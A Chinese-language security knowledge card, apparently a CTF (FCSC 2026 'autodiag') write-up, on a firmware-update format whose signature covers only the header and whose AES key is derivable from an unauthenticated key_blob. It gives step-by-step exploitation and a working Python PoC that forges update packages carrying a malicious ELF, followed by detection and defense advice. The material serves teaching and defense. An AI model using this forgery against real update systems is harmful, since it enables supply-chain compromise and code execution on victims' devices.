---
id: crypto-protocol-update-signature-header-only-keyblob-unauthenticated
title: 固件更新签名只覆盖 header：复用 sig/key_blob 重加密载荷，raw RSA 派生 AES key
type: scenario
domain: crypto
path: crypto/protocol
technique: update-signature-header-only-keyblob-unauthenticated
aliases:
- 更新包签名覆盖不全
- UPD0 格式
- raw RSA 公钥运算
- key_blob 未认证
- AES-CBC 零 IV
- 固件更新完整性绕过
- memfd 执行更新载荷
tags:
- update
- signature
- rsa
- aes
- integrity
- supply-chain
- protocol
- memfd
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V115
  verified_at: '2026-11-06T01:52:54+08:00'
  notes: 已对照原文 autodiag update runner 核对：UPD0、header(h_size)||sig(0x100)||key_blob(0x100)||ct、签名仅 rsa_public_raw(sig)[:32]==sha256(header)、key 由 key_blob 公钥运算派生、AES-256-CBC 零 IV+PKCS#7+gunzip、复用 header/sig/key_blob 换密文、memfd+execveat 执行均一致；原文有实测 flag，未本机复跑。
---

## 一句话结论

固件/软件更新包把签名设计成“只对 header 做 `rsa_public_raw(sig)[:32] == sha256(header)`”，而 AES key 由未认证的 `key_blob` 经 raw RSA 公钥运算派生、密文又没有任何完整性保护；攻击者可以原样复用合法包的 `header || sig || key_blob`，用公钥算出同一 AES key，重新加密自己的恶意载荷替换末段密文，签名校验仍然通过，更新器解压后直接执行攻击者的 ELF。

## 原理

- 更新包格式：
  ```text
  header(h_size) || sig(0x100) || key_blob(0x100) || ciphertext
  ```
- 校验逻辑：
  ```c
  hdr_hash = sha256(buf, h_size);
  sig_plain = rsa_public_raw(rsa, buf + off_sig);
  if (memcmp(sig_plain, hdr_hash, 32) != 0) reject;
  key_plain = rsa_public_raw(rsa, buf + off_key);
  aes_key = key_plain[:32];
  pt = aes256_cbc_decrypt_zero_iv(ciphertext, aes_key);
  pt = pkcs7_unpad(pt);
  return gunzip_all(pt);
  ```
- 三个设计错误叠加：
  1. 签名只覆盖 `header`，不覆盖 `key_blob` 和 `ciphertext`；攻击者可以保留合法 header/sig，只改密文。
  2. `key_blob` 没有签名/完整性保护，且 `rsa_public_raw` 只是 `blob^e mod n`（公钥运算），不是“只有私钥能解”的操作；任何拿到公钥的人都能对合法 key_blob 复算出同一 AES key。
  3. AES-CBC 使用固定全零 IV、无 AEAD/MAC；密文可被任意替换，解密后的 PKCS#7 填充和 gzip 只要自洽即可。
- 攻击者不需要伪造 RSA 签名，也不需要修改 header：直接复用 `header || sig || key_blob`，计算 `aes_key = rsa_public_raw(key_blob)[:32]`，把恶意 ELF gzip 后 AES-256-CBC 加密（零 IV、PKCS#7），替换原密文。
- 更新器解密、解压后调用 `memfd_create` + `fchmod(0755)` + `write` + `execveat(fd, "", argv, environ, AT_EMPTY_PATH)`，直接把载荷当作可执行文件运行。
- 最终权限取决于更新器进程：若更新器以 root 或可执行 setuid 程序运行，则恶意载荷获得相应权限；本例更新器为 nobody，但可执行 setuid root 的 `/printflag` 读 flag。

## 触发条件

- 更新包格式使用“签名只覆盖 header/元数据”的设计，key_blob/密文未被签名或 MAC 覆盖。
- AES key 由公钥运算或公开数据派生，攻击者可复算。
- 加密模式无完整性保护（CBC/CTR 无 MAC），或 MAC 不覆盖密文。
- 攻击者能向更新接口提交任意更新包（如内部 DBus 方法、HTTP 上传、本地文件替换）。
- 更新器会执行解密后的载荷（memfd/临时文件/直接 dlopen）。

## 利用步骤

1. 获取一份合法更新包与公钥（附件/固件镜像/更新服务器均可）。
2. 解析格式：读 `h_size`，定位 `sig`、`key_blob`、`ciphertext` 偏移。
3. 用公钥对 `key_blob` 做 `pow(int(blob), e, n)`，取前 32 字节得到 AES key。
4. 准备恶意载荷 ELF（如连接回连地址后执行 `/printflag`），gzip 压缩，按 PKCS#7 填充后用 AES-256-CBC（IV=0）加密。
5. 拼接 `old_header || old_sig || old_key_blob || new_ciphertext`，base64 编码后提交给更新接口。
6. 更新器验签通过（header 未变）、用同一 key 解出恶意 ELF、memfd 执行；通过回连或输出读取结果。
7. 若载荷较大，按协议分块提交；只要最终字节流是完整更新包即可。

## PoC

```python
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import gzip, base64, struct

buf = open("update.bin", "rb").read()
assert buf[:4] == b"UPD0"
h_size = struct.unpack("<I", buf[8:12])[0]
off_sig = h_size
off_key = off_sig + 256
off_ct  = off_key + 256
header_sig_key = buf[:off_ct]
key_blob = buf[off_key:off_ct]

pub = serialization.load_pem_public_key(open("public.pem", "rb").read())
nums = pub.public_numbers()
key_plain = pow(int.from_bytes(key_blob, "big"), nums.e, nums.n).to_bytes(256, "big")
aes_key = key_plain[:32]

payload = open("evil.elf", "rb").read()
pt = gzip.compress(payload)
pad = 16 - len(pt) % 16
pt += bytes([pad]) * pad
enc = Cipher(algorithms.AES(aes_key), modes.CBC(b"\0" * 16)).encryptor()
ct = enc.update(pt) + enc.finalize()
forged = header_sig_key + ct
print(base64.b64encode(forged).decode())
```

PoC 为格式复现示意，未对真实更新器执行；具体字段偏移/填充/大小限制按目标实现调整。

## 变体与关联

- 变体：签名覆盖 header + 密文 hash，但不覆盖 key_blob；攻击者仍可替换 key_blob 让解密结果可控，或重放旧 key_blob。
- 变体：AES key 直接硬编码/由公开常量派生；或使用 ECB/固定 IV，导致密文可预测。
- 变体：更新包使用 zip/tar 等容器，签名只覆盖清单文件，容器内其他文件未覆盖；与供应链投毒类似。
- 关联卡片：[[web-generic-auth-api-signature-method-scope-replay-bypass]]（签名覆盖范围不足导致重放/篡改）、[[cloud-cicd-npm-postinstall-supply-chain-poisoning]]（更新/安装链投毒）、[[binary-pwn-signed-index-scale-wrap-adjacent-fd]]（同题 autodiag 的入口越界）。
- 注意：本例为 Hackropole FCSC 2026 autodiag 题；真实固件更新需具体分析签名覆盖范围与密钥派生。

## 检测与防御

- 防御：签名必须覆盖完整更新包（header + key_blob + 密文哈希/长度/版本），或使用 AEAD（AES-GCM/ChaCha20-Poly1305）并把所有元数据作为 AAD。
- 防御：不要把“公钥运算”当作解密/密钥协商；AES key 应由私钥解封（RSA-OAEP）或由受认证的密钥交换派生，且 key_blob 必须签名。
- 防御：使用独立代码签名验证最终 ELF；更新器以最小权限运行，禁止执行未签名载荷；校验版本防回滚。
- 检测：更新包中 header 与历史合法包相同但密文不同；key_blob 复用；签名覆盖范围审计；更新器执行 memfd/临时文件；异常回连。
- 响应：隔离更新器、回滚固件、轮换更新签名密钥、审计更新服务器与分发链路。
